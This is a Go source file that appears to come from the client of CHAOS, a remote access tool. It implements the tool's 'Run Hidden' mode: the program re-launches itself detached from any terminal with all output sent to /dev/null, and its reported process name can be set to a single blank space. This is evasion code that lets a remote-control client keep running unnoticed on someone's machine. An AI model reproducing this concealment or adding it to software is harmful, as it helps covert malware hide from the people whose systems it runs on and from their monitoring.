//go:build linux || darwin

package process

import (
	"os"

	"github.com/tiagorlampert/CHAOS/client/app/utils/process/exec"
)

const hiddenEnvVar = "CHAOS_RUN_HIDDEN"

// EmptyName is the process name shown while Run Hidden is enabled.
const EmptyName = " "

// Hide restarts the process in its own session with the standard streams
// redirected to /dev/null, so it keeps running without a terminal.
// It reports whether the current process is the parent that should exit.
func Hide() (bool, error) {
	if os.Getenv(hiddenEnvVar) == "1" {
		return false, nil
	}

	executable, err := os.Executable()
	if err != nil {
		return false, err
	}

	devNull, err := os.OpenFile(os.DevNull, os.O_RDWR, 0)
	if err != nil {
		return false, err
	}
	defer devNull.Close()

	cmd, err := exec.Command(executable)
	if err != nil {
		return false, err
	}
	cmd.Env = append(os.Environ(), hiddenEnvVar+"=1")
	cmd.Stdin = devNull
	cmd.Stdout = devNull
	cmd.Stderr = devNull
	cmd.SysProcAttr = detachedSysProcAttr()

	if err := cmd.Start(); err != nil {
		return false, err
	}
	return true, nil
}

// SetName changes the reported process name.
func SetName(name string) {
	setProcessName(name)
}
